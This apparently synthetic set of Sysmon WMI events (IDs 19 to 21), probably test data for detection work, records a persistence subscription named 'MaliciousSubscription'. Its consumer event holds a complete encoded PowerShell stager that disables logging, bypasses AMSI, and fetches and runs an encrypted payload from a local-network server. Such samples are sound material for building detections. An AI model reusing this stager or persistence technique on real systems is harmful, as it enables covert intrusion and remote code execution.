{
  "Event": {
    "EventData": {
      "EventNamespace": " \"root\\\\CimV2\"",
      "EventType": "WmiFilterEvent",
      "Name": " \"MaliciousSubscription\"",
      "Operation": "Created",
      "Query": " \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"",
      "User": "GenEric-PC\\Gen Eric",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "19",
      "EventRecordID": "746275",
      "Execution": {
        "ProcessID": "1332",
        "ThreadID": "2748"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "19",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "3"
    }
  }
}
{
  "Event": {
    "EventData": {
      "Destination": " \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -NonI -W hidden -enc JABHAHIAbwBVAFAAUABvAGwAaQBjAHkAUwBlAFQAVABpAE4ARwBTACAAPQAgAFsAcgBFAEYAXQAuAEEAUwBTAEUAbQBiAGwAWQAuAEcARQBUAFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAdABGAGkARQBgAGwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAgACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBHAEUAdABWAGEATABVAEUAKAAkAG4AVQBMAGwAKQA7ACQARwByAE8AVQBwAFAAbwBsAGkAYwBZAFMARQBUAFQASQBOAGcAcwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AIAA9ACAAMAA7ACQARwBSAE8AdQBwAFAAbwBMAGkAQwBZAFMAZQB0AHQASQBOAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQAgAD0AIAAwADsAWwBSAEUAZgBdAC4AQQBTAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAEUAdABGAEkAZQBsAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAQQBMAFUARQAoACQAbgBVAEwATAAsACQAVABSAHUAZQApAH0AOwBbAFMAeQBTAHQARQBNAC4ATgBFAHQALgBTAEUAcgB2AEkAYwBlAFAATwBpAG4AVABNAGEATgBhAEcARQBSAF0AOgA6AEUAWABQAEUAQwBUADEAMAAwAEMAbwBuAHQASQBOAFUAZQA9ADAAOwAkAFcAYwA9AE4ARQB3AC0ATwBCAEoAZQBDAFQAIABTAHkAUwBUAEUAbQAuAE4ARQBUAC4AVwBlAGIAQwBsAGkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABXAGMALgBIAGUAQQBEAEUAcgBTAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAB3AEMALgBQAHIATwB4AFkAPQBbAFMAWQBTAHQAZQBNAC4ATgBFAHQALgBXAEUAYgBSAGUAcQBVAGUAUwBUAF0AOgA6AEQAZQBmAGEAVQBsAHQAVwBFAEIAUAByAG8AWAB5ADsAJABXAEMALgBQAFIATwBYAHkALgBDAHIARQBEAGUATgB0AGkAQQBMAFMAIAA9ACAAWwBTAFkAUwB0AGUAbQAuAE4AZQBUAC4AQwByAGUARABlAE4AVABJAGEATABDAGEAQwBoAGUAXQA6ADoARABFAGYAYQB1AGwAdABOAEUAVABXAG8AcgBLAEMAUgBlAGQAZQBOAFQASQBBAEwAUwA7ACQASwA9AFsAUwB5AHMAdABlAG0ALgBUAEUAWAB0AC4ARQBuAEMATwBEAEkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAeQB0AGUAcwAoACcAOAAwADcAZgBkAGUAMAA1ADQANQAxAGQAZABjADgANQAzADgAYQBkAGUAZgBjADIAZABiADAAMgAyADYAYgAyACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABPAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAdwBDAC4ASABFAGEAZABlAHIAUwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0ANwA1AEIALwAwAG0AdAB2AGEAeQBPAEUAeABkAGsAagBIADAAdABtAGkAQgBmAEIAYwBTAGMAPQAiACkAOwAkAHMAZQByAD0AJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA1ADYALgAxADoAOAAwADgAMAAnADsAJAB0AD0AJwAvAGEAZABtAGkAbgAvAGcAZQB0AC4AcABoAHAAJwA7ACQAZABBAHQAQQA9ACQAVwBDAC4ARABvAHcAbgBMAG8AQQBkAEQAQQB0AGEAKAAkAFMARQByACsAJAB0ACkAOwAkAEkAdgA9ACQAZABhAFQAYQBbADAALgAuADMAXQA7ACQARABhAHQAQQA9ACQAZABBAHQAYQBbADQALgAuACQARABBAFQAYQAuAEwAZQBuAGcAdABoAF0AOwAtAGoATwBpAG4AWwBDAGgAQQBSAFsAXQBdACgAJgAgACQAUgAgACQARABBAHQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\"",
      "EventType": "WmiConsumerEvent",
      "Name": " \"MaliciousSubscription\"",
      "Operation": "Created",
      "Type": "Command Line",
      "User": "GenEric-PC\\Gen Eric",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "20",
      "EventRecordID": "746278",
      "Execution": {
        "ProcessID": "1332",
        "ThreadID": "2748"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "20",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "3"
    }
  }
}
{
  "Event": {
    "EventData": {
      "Consumer": " \"CommandLineEventConsumer.Name=\\\"MaliciousSubscription\\\"\"",
      "EventType": "WmiBindingEvent",
      "Filter": " \"__EventFilter.Name=\\\"MaliciousSubscription\\\"\"",
      "Operation": "Created",
      "User": "GenEric-PC\\Gen Eric",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "21",
      "EventRecordID": "748717",
      "Execution": {
        "ProcessID": "1332",
        "ThreadID": "2748"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "21",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "3"
    }
  }
}
